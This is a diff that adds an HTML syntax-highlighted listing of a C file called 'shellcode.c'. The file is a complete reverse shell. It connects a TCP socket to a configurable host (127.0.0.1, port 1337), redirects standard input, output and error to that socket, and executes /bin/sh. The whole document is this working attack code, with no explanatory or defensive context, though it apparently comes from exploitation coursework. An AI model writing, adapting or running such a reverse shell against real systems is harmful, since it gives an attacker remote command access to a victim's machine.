@@ -1,0 +1,58 @@
+<html>
+<head>
+<title>shellcode.c</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<style type="text/css">
+.ln { color: #606366; font-weight: normal; font-style: normal; }
+.s0 { color: rgb(204,120,50); }
+.s1 { color: rgb(169,183,198); }
+.s2 { color: rgb(106,135,89); }
+.s3 { color: rgb(104,151,187); }
+.s4 { color: rgb(128,128,128); }
+</style>
+</head>
+<BODY BGCOLOR="#2b2b2b">
+<TABLE CELLSPACING=0 CELLPADDING=5 COLS=1 WIDTH="100%" BGCOLOR="#606060" >
+<TR><TD><CENTER>
+<FONT FACE="Arial, Helvetica" COLOR="#000000">
+shellcode.c</FONT>
+</center></TD></TR></TABLE>
+<pre>
+<a name="l1"><span class="ln">1    </span></a><span class="s0">#include </span><span class="s1">&lt;arpa/inet.h&gt; 
+<a name="l2"><span class="ln">2    </span></a></span><span class="s0">#include </span><span class="s1">&lt;errno.h&gt; 
+<a name="l3"><span class="ln">3    </span></a></span><span class="s0">#include </span><span class="s1">&lt;fcntl.h&gt; 
+<a name="l4"><span class="ln">4    </span></a></span><span class="s0">#include </span><span class="s1">&lt;netinet/in.h&gt; 
+<a name="l5"><span class="ln">5    </span></a></span><span class="s0">#include </span><span class="s1">&lt;stdio.h&gt; 
+<a name="l6"><span class="ln">6    </span></a></span><span class="s0">#include </span><span class="s1">&lt;stdlib.h&gt; 
+<a name="l7"><span class="ln">7    </span></a></span><span class="s0">#include </span><span class="s1">&lt;string.h&gt; 
+<a name="l8"><span class="ln">8    </span></a></span><span class="s0">#include </span><span class="s1">&lt;sys/socket.h&gt; 
+<a name="l9"><span class="ln">9    </span></a></span><span class="s0">#include </span><span class="s1">&lt;sys/types.h&gt; 
+<a name="l10"><span class="ln">10   </span></a></span><span class="s0">#include </span><span class="s1">&lt;unistd.h&gt; 
+<a name="l11"><span class="ln">11   </span></a> 
+<a name="l12"><span class="ln">12   </span></a></span><span class="s0">#define </span><span class="s1">HOST     </span><span class="s2">&quot;127.0.0.1&quot;</span><span class="s1"> 
+<a name="l13"><span class="ln">13   </span></a></span><span class="s0">#define </span><span class="s1">PORT     </span><span class="s3">1337</span><span class="s1"> 
+<a name="l14"><span class="ln">14   </span></a></span><span class="s0">#define </span><span class="s1">SHELL </span><span class="s2">&quot;/bin/sh&quot;</span><span class="s1"> 
+<a name="l15"><span class="ln">15   </span></a> 
+<a name="l16"><span class="ln">16   </span></a></span><span class="s0">int </span><span class="s1">main(</span><span class="s0">int </span><span class="s1">argc, </span><span class="s0">char</span><span class="s1">* argv[]){ 
+<a name="l17"><span class="ln">17   </span></a> 
+<a name="l18"><span class="ln">18   </span></a>    </span><span class="s0">struct </span><span class="s1">sockaddr_in serv_addr = {</span><span class="s3">0</span><span class="s1">}; 
+<a name="l19"><span class="ln">19   </span></a>    </span><span class="s0">int </span><span class="s1">socketFd = socket(AF_INET, SOCK_STREAM, </span><span class="s3">0</span><span class="s1">); 
+<a name="l20"><span class="ln">20   </span></a> 
+<a name="l21"><span class="ln">21   </span></a>    serv_addr.sin_family      = AF_INET; 
+<a name="l22"><span class="ln">22   </span></a>    serv_addr.sin_port        = htons(PORT); 
+<a name="l23"><span class="ln">23   </span></a>    serv_addr.sin_addr.s_addr = inet_addr(HOST); 
+<a name="l24"><span class="ln">24   </span></a> 
+<a name="l25"><span class="ln">25   </span></a>    connect(socketFd, (</span><span class="s0">struct </span><span class="s1">sockaddr*) &amp;serv_addr, </span><span class="s0">sizeof</span><span class="s1">(serv_addr)); 
+<a name="l26"><span class="ln">26   </span></a> 
+<a name="l27"><span class="ln">27   </span></a>    dup2(socketFd, </span><span class="s3">0</span><span class="s1">); </span><span class="s4">// redirect stdin to socket</span><span class="s1"> 
+<a name="l28"><span class="ln">28   </span></a>    dup2(socketFd, </span><span class="s3">1</span><span class="s1">); </span><span class="s4">// redirect stdout to socket</span><span class="s1"> 
+<a name="l29"><span class="ln">29   </span></a>    dup2(socketFd, </span><span class="s3">2</span><span class="s1">); </span><span class="s4">// redirect stderr to socket</span><span class="s1"> 
+<a name="l30"><span class="ln">30   </span></a> 
+<a name="l31"><span class="ln">31   </span></a>    </span><span class="s0">char</span><span class="s1">* args[] = {NULL}; 
+<a name="l32"><span class="ln">32   </span></a> 
+<a name="l33"><span class="ln">33   </span></a>    execv(SHELL, args); 
+<a name="l34"><span class="ln">34   </span></a> 
+<a name="l35"><span class="ln">35   </span></a>    </span><span class="s0">return </span><span class="s3">0</span><span class="s1">; 
+<a name="l36"><span class="ln">36   </span></a>}</span></pre>
+</body>
+</html>
